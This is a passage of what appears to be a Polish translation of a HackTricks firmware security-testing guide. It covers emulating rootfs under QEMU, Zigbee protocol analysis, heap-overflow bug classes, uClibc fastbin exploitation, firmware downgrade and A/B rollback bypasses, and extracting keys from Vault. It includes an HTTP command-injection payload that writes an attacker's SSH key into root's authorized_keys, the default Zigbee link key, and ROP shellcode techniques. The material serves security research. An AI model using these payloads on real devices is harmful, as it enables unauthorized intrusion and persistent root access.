Odtwórz dokładnie działania arytmetyczne wykonywane przez firmware. W szczególności ustal, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; zachowaj oryginalną kolejność przesunięć bitowych i obcinania; uwzględnij też zależne od banku końcowe obszary w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego przez `partition_bytes // 512` może przesunąć dołączony obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tabele SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces walidacji wygląda następująco:<sup>[[11]](#references)</sup>

1. Na podstawie pliku binarnego weryfikatora/init odtwórz urządzenie źródłowe, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz lub zmapuj obszary, nie zmieniając zasad ich wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych prawidłowych struktur metadanych, zamiast uznawać za wystarczający sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowany `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty stanowi mocniejszy dowód niż `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany system główny można uruchomić, zastępując weryfikujący proces PID 1 dostawcy niewielkim, statycznie linkowanym programem init. To **zastąpienie łańcucha rozruchowego w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza powiązanego z TPM.<sup>[[11]](#references)</sup>

Zastępczy program init powinien odzwierciedlać operacyjne elementy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, poczekać na dostarczone urządzenie blokowe, zamontować zmodyfikowany system główny tylko do odczytu, odłączyć pseud systemy plików starego systemu głównego, przenieść nowe montowanie na `/`, wykonać `chroot` i uruchomić przez `execve()` oryginalny plik firmware'u `/sbin/init`. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego systemu głównego.<sup>[[11]](#references)</sup>

Zachowaj zmienny stan urządzenia oddzielnie od zmodyfikowanego, niezmiennego systemu głównego. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio tylko do odczytu może udostępniać zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu w trybie offline

Sprawdź trwały stan poza systemem gościa, gdy długie uruchamianie, destrukcyjne skrypty startowe lub niewiarygodne logi konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj nakładki używanej przez działającą maszynę wirtualną; udostępnij ją za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do przeznaczonej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Aby powtarzalnie izolować usterki, zapisuj pliki znaczników ze znacznikami czasu na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą powodować fałszywe wyniki negatywne z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanych fragmentów kodu porównaj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje systemu plików ext4 na dysku z konfiguracją jądra oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wynikającymi z PCI. Komponent może istnieć, a nawet poprawnie załadować się przez `dlopen()`, a mimo to być bezużyteczny, ponieważ jego odbiorca oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy wykorzystuje się rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu powłoki do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać dokładnie interakcji ze sprzętem, co może wymagać okresowego ponownego uruchamiania emulatora. Analiza powinna obejmować ponowne sprawdzenie systemu plików, wykorzystanie udostępnionych stron internetowych i usług sieciowych oraz badanie podatności bootloadera. Testy integralności firmware’u mają kluczowe znaczenie dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać breakpointy i wykrywać podatności za pomocą fuzzingu oraz innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radiowy MCU** a proces działający w przestrzeni użytkownika systemu Linux. Przydatny sposób działania to mapowanie ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** w radiowym MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (np. `/dev/tty*`)
4. **Dyspozytor aplikacji** w głównym daemonie
5. **Procedura obsługi / maszyna stanów** specyficzna dla protokołu

Ta architektura daje dwa cele analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odtwórz:

- **Grupy komunikatów** i tablice dyspozytora
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające dla danego producenta** (np. Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które procedury obsługi są dostępne wyłącznie podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu podczas commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, dlatego sprawdź, czy testowane urządzenie rzeczywiście wymusza ich użycie.

### Procedury obsługi protokołów specyficzne dla producenta i dostępność ograniczona przez FSM

Polecenia Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **maszyn FSM**, które przeszły mniej gruntowne testy walidacji.<sup>[[8]](#references)</sup>

Praktyczny sposób działania:

- Analizuj wstecz dyspozytor poleceń, aż znajdziesz **procedurę obsługi dostępną tylko dla producenta**.
- Odtwórz tabele **stanów FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **następnych stanów**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponawiania prób/błędów, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
- Ustal, jakie prawidłowe wymiany protokołu są wymagane, aby wprowadzić daemon w podatny stan, zamiast zakładać, że wadliwa procedura obsługi jest zawsze osiągalna.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów z frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (np. **nRF52840**) z użyciem stosu klasy producenckiej, aby udostępnić właściwe **endpointy**, **atrybuty** i timing commissioning.

### Klasa błędów związanych z fragmentowanym pobieraniem wbudowanych daemonów

Powtarzająca się klasa błędów firmware występuje przy **fragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają jedynie kontrolowane przez atakującego pola dotyczące **bieżącego pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania, czy mieści się w **pierwotnie zaalokowanym rozmiarze**.

Dzięki temu atakujący może wysłać:

- Pierwszy prawidłowy fragment z zadeklarowanym **małym** rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Spreparowany rozmiar dotyczący bieżącego pakietu, który przechodzi nowe kontrole, a jednocześnie powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest dostępna dopiero po przejściu logiki commissioning, exploitacja musi obejmować wystarczającą **emulację urządzenia**, by doprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalacze `free()` sterowane protokołem

W wbudowanych daemonach najłatwiejszym sposobem wywołania eksploatacji metadanych sterty często nie jest „czekanie na sprzątanie”, lecz **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania próby** lub **błędu**.
- Przekrocz limit ponowień, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj przewidywalne wywołanie `free()`, by uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w wbudowanym systemie Linux, gdzie uszkodzenie metadanych chunków może przekształcić logikę unlink/unbin w prymityw zapisu. Stabilnym podejściem jest uszkodzenie **pola rozmiaru**, aby skierować przeglądanie alokatora na **fałszywe chunki umieszczone w przepełnionym buforze**, zamiast od razu nadpisywać wskaźniki rzeczywistych binów i powodować awarię procesu.

## Eksploatacja binarna i Proof-of-Concept

Opracowanie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Zabezpieczenia binarne w czasie działania systemu są rzadkością w systemach wbudowanych, ale jeśli występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące eksploatacji fastbin w uClibc (wbudowany Linux)

- **Fastbiny + konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może uruchomić `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` i sąsiednie chunki uznane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz binarnego pliku są stabilne. Możesz wskazać obszar przypominający prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin na **tablicę wskaźników funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do wykorzystania w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu pamięci i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki polegające na downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet gdy producent wdraża kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania weryfikuje jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie porównuje *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starsze, podatne firmware z prawidłowym podpisem**, przywracając tym samym załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN-u lub strony pomocy technicznej.
   * Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` w pliku Android APK).
   * Pozyskaj go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** za pośrednictwem dowolnego dostępnego kanału aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują bloby firmware zakodowane w Base64, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność załatana w nowszym wydaniu (np. filtr command injection dodany w późniejszej wersji).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym firmware (z obniżoną wersją) parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez oczyszczania, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu do konta root za pomocą klucza SSH). W nowszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed obniżeniem wersji sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do towarzyszących im aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w postaci niezaszyfrowanej w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykły `unzip` pozwalają wyodrębnić podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Ominięcie zabezpieczenia przed downgrade’em wyłącznie w updaterze w układach z gniazdami A/B

Niektórzy dostawcy wdrażają **ratchet** chroniący przed downgrade’em, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie odzyskiwania lub agencie OTA w przestrzeni użytkownika). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym gniazda, ochronę przed rollbackiem nadal można ominąć.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware’u zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- **Bootloader** nie analizuje tego ratcheta i przed uruchomieniem wybranego gniazda weryfikuje tylko nagłówek, CRC i sygnaturę.
- Aktywacja gniazda jest zapisywana osobno — w tablicy partycji lub liczniku generacji dla danego gniazda — i **nie jest kryptograficznie powiązana** z dokładnym skrótem zweryfikowanego firmware’u.

Tworzy to w systemach z dwoma gniazdami prymityw **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy gniazdo B jako następny cel rozruchu na podstawie aktualnego, podpisanego obrazu, a następnie nadpisać gniazdo B przed ponownym uruchomieniem, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa tylko wcześniej zatwierdzonym metadanym gniazda.

Typowy wzorzec nadużycia:

1. Prześlij **aktualny, podpisany** firmware do nieaktywnego gniazda i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył to gniazdo jako następne aktywne.
2. **Na razie nie uruchamiaj ponownie urządzenia**. W tej samej sesji ponownie uruchom procedurę przygotowania/wymazywania gniazda.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru gniazda, aby updater wymazał **to samo fizyczne gniazdo**, które właśnie zostało promowane.
4. Zapisz w tym gnieździe **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera promowane gniazdo, weryfikuje tylko sygnaturę/integralność i uruchamia stary obraz.

Na co zwrócić uwagę podczas analizy wstecznej implementacji aktualizacji A/B:

- Wybór gniazda oparty na **flagach rozruchowych**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w rodzaju `prepare_passive_slot()`, która wymazuje gniazdo na podstawie nieaktualnego stanu zamiast **aktualnego, zatwierdzonego układu**.
- Funkcja w rodzaju `part_write_layout()`, która tylko zwiększa **licznik generacji** / ustawia flagę aktywności, ale nie zapisuje skrótu zweryfikowanego obrazu.
- Sprawdzanie ratcheta zaimplementowane w przestrzeni użytkownika lub kodzie updatera, ale **nie** w ROM-ie / bootloaderze / etapach secure boot.
- Procedury wymazywania lub odzyskiwania, które pozostawiają gniazdo oznaczone jako możliwe do uruchomienia, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport i uwierzytelnianie *endpointu aktualizacji* są odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko sygnaturę/CRC?
* Czy metadane aktywacji gniazda są **powiązane ze zweryfikowanym skrótem/wersją firmware’u**, czy też gniazdo można zmodyfikować po jego promowaniu?
* Czy po pomyślnym przełączeniu gniazda urządzenie musi się uruchomić ponownie, czy też w tej samej sesji nadal można wywoływać procedury aktualizacji/wymazywania?
* Czy kod przestrzeni użytkownika wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* ścieżki aktualizacji korzystają z tej samej logiki weryfikacji?

> 💡  Jeśli któregoś z powyższych elementów brakuje, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów podatnego firmware’u.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware’u ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji zawiera niewielkie metadane w postaci jawnej oraz duży blob o wysokiej entropii, przed próbami brute-force najpierw przeanalizuj strukturę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, przesunięcia i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje szyfrogram RSA-2048 opakowujący losowe hasło/klucz sesji firmware’u.
- Odłączony materiał PGP w tym samym pliku często służy wyłącznie do ochrony autentyczności; nie zakładaj, że zapewnia poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) niczego nie ujawni, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast ograniczać się do szukania kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony główny system plików pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także plików jednostek i skryptów inicjalizacyjnych.
- Traktuj jawne polecenia `vault operator unseal ...`, klucze odzyskiwania, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 ani nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie stosują SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez producenta (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz odszyfrować AES-CBC.

Dzięki temu „zaszyfrowane firmware” staje się bardziej ogólnym problemem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware’u z Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia testowania bezpieczeństwa firmware’u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: Kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie luk zero-day w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 USD dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania — część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystywanie luk w Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linuksa — dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie danych z pamięci SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn — narzędzie do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — odświeżenie wiedzy o hackingu sprzętu, część 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Jak i dlaczego zhackowaliśmy portfel sprzętowy Cypherock: pełna historia](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
